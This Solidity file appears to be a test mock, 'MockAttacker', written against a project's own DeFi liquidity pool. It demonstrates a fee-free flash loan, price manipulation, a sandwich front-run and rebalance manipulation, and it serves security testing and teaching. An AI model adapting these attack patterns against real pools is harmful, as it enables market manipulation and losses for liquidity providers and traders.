// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "../DeFiLiquidityPool.sol";

/**
 * @title MockAttacker
 * @notice Attacker contract to demonstrate pool vulnerabilities
 * @dev FOR EDUCATIONAL PURPOSES ONLY - Demonstrates common DeFi attacks
 */
contract MockAttacker {
    using SafeERC20 for IERC20;
    
    DeFiLiquidityPool public pool;
    IERC20 public tokenA;
    IERC20 public tokenB;
    
    // Attack state
    bool public attackInProgress;
    uint256 public profitA;
    uint256 public profitB;
    
    // Attack configuration
    uint256 public flashLoanAmount;
    bool public targetTokenA;
    
    constructor(
        DeFiLiquidityPool _pool,
        IERC20 _tokenA,
        IERC20 _tokenB
    ) {
        pool = _pool;
        tokenA = _tokenA;
        tokenB = _tokenB;
    }
    
    // ============ Flash Loan Attack ============
    
    /**
     * @notice Flash loan attack without fees
     * @dev Demonstrates how to exploit free flash loans
     * @param amount Amount to borrow
     * @param isTokenA Whether to attack with token A or B
     */
    function flashLoanAttack(uint256 amount, bool isTokenA) external {
        require(!attackInProgress, "Attack already in progress");
        
        flashLoanAmount = amount;
        targetTokenA = isTokenA;
        attackInProgress = true;
        
        // Save initial balance
        uint256 initialBalanceA = tokenA.balanceOf(address(this));
        uint256 initialBalanceB = tokenB.balanceOf(address(this));
        
        // Execute flash loan
        pool.flashLoan(amount, isTokenA);
        
        // Calculate profit
        uint256 finalBalanceA = tokenA.balanceOf(address(this));
        uint256 finalBalanceB = tokenB.balanceOf(address(this));
        
        if (finalBalanceA > initialBalanceA) {
            profitA = finalBalanceA - initialBalanceA;
        }
        if (finalBalanceB > initialBalanceB) {
            profitB = finalBalanceB - initialBalanceB;
        }
        
        attackInProgress = false;
    }
    
    /**
     * @notice Flash loan callback
     * @dev Here the attack logic is executed
     */
    function receiveFlashLoan(address token, uint256 amount) external {
        require(msg.sender == address(pool), "Only pool can call");
        require(attackInProgress, "No attack in progress");
        
        // === SIMPLE ATTACK: Just use the flash loan ===
        
        // 1. We received the flash loan tokens for free
        // 2. In a real attack, we would do arbitrage between pools
        // 3. For demo purposes, we just hold the tokens and return them
        
        // The vulnerability is that we got to use the tokens with NO FEES
        // In a real scenario, we would profit from arbitrage opportunities
        
        // Return the flash loan (no fees - vulnerability)
        // The contract only verifies that balance >= initial
        // It doesn't charge fees, so any profit is pure gain
        IERC20(token).safeTransfer(msg.sender, amount);
    }
    
    // ============ Price Manipulation Attack ============
    
    /**
     * @notice Price manipulation attack
     * @dev Demonstrates how to manipulate pool price
     * @param swapAmount Amount for the initial swap
     */
    function priceManipulationAttack(uint256 swapAmount) external {
        require(tokenA.balanceOf(address(this)) >= swapAmount, "Insufficient balance");
        
        // Save initial price
        uint256 initialPrice = pool.getCurrentPrice();
        
        // 1. Make moderate swap to move price (reduce amount to avoid slippage protection)
        uint256 actualSwapAmount = swapAmount / 10; // Use only 10% of requested amount
        tokenA.approve(address(pool), actualSwapAmount);
        uint256 amountOut = pool.swap(address(tokenA), actualSwapAmount, 0);
        
        // 2. Price after swap
        uint256 manipulatedPrice = pool.getCurrentPrice();
        
        // 3. Here you could exploit the manipulated price
        // For example, in another protocol that uses this pool as oracle
        
        // 4. Optional: Revert the manipulation
        tokenB.approve(address(pool), amountOut);
        pool.swap(address(tokenB), amountOut, 0);
        
        // Log the attack
        emit PriceManipulated(initialPrice, manipulatedPrice, swapAmount);
    }
    
    // ============ Sandwich Attack ============
    
    /**
     * @notice Sandwich attack
     * @dev Demonstrates basic front-running
     * @param victimSwapAmount Amount the victim will swap
     */
    function sandwichAttack(uint256 victimSwapAmount) external {
        require(tokenA.balanceOf(address(this)) >= victimSwapAmount, "Insufficient balance");
        
        // 1. Front-run: Make swap before victim (use smaller amount to avoid slippage protection)
        uint256 frontRunSwapAmount = victimSwapAmount / 10; // Use 10% of victim amount
        tokenA.approve(address(pool), frontRunSwapAmount);
        uint256 frontRunAmount = pool.swap(address(tokenA), frontRunSwapAmount, 0);
        
        // 2. Here the victim would make their swap (simulated)
        // In reality, this would require MEV bots and mempool monitoring
        
        // 3. Back-run: Make reverse swap after victim
        tokenB.approve(address(pool), frontRunAmount);
        pool.swap(address(tokenB), frontRunAmount, 0);
        
        emit SandwichAttackExecuted(victimSwapAmount, frontRunSwapAmount);
    }
    
    // ============ Rebalance Manipulation ============
    
    /**
     * @notice Rebalance manipulation attack
     * @dev Demonstrates how to exploit rebalancing logic
     */
    function rebalanceManipulationAttack() external {
        // Get current state
        (uint256 reserveA, uint256 reserveB) = pool.getReserves();
        
        // Calculate swap to force rebalance
        uint256 swapAmount = (reserveA * 3000) / 10000; // 30% of reserve
        
        require(tokenA.balanceOf(address(this)) >= swapAmount, "Insufficient balance");
        
        // Execute swap to create imbalance
        tokenA.approve(address(pool), swapAmount);
        pool.swap(address(tokenA), swapAmount, 0);
        
        // Automatic rebalancing is triggered
        // This could create arbitrage opportunities
        
        emit RebalanceManipulated(reserveA, reserveB, swapAmount);
    }
    
    // ============ Utility Functions ============
    
    /**
     * @notice Deposit tokens for attacks
     */
    function deposit(uint256 amountA, uint256 amountB) external {
        if (amountA > 0) {
            tokenA.safeTransferFrom(msg.sender, address(this), amountA);
        }
        if (amountB > 0) {
            tokenB.safeTransferFrom(msg.sender, address(this), amountB);
        }
    }
    
    /**
     * @notice Withdraw tokens after attacks
     */
    function withdraw() external {
        uint256 balanceA = tokenA.balanceOf(address(this));
        uint256 balanceB = tokenB.balanceOf(address(this));
        
        if (balanceA > 0) {
            tokenA.safeTransfer(msg.sender, balanceA);
        }
        if (balanceB > 0) {
            tokenB.safeTransfer(msg.sender, balanceB);
        }
    }
    
    /**
     * @notice Get current balances
     */
    function getBalances() external view returns (uint256 balanceA, uint256 balanceB) {
        return (tokenA.balanceOf(address(this)), tokenB.balanceOf(address(this)));
    }
    
    /**
     * @notice Get profits from last attack
     */
    function getLastAttackProfit() external view returns (uint256 _profitA, uint256 _profitB) {
        return (profitA, profitB);
    }
    
    // ============ Events ============
    
    event PriceManipulated(
        uint256 initialPrice,
        uint256 manipulatedPrice,
        uint256 swapAmount
    );
    
    event SandwichAttackExecuted(
        uint256 victimAmount,
        uint256 frontRunAmount
    );
    
    event RebalanceManipulated(
        uint256 initialReserveA,
        uint256 initialReserveB,
        uint256 swapAmount
    );
    
    event FlashLoanAttackCompleted(
        uint256 profitA,
        uint256 profitB
    );
} 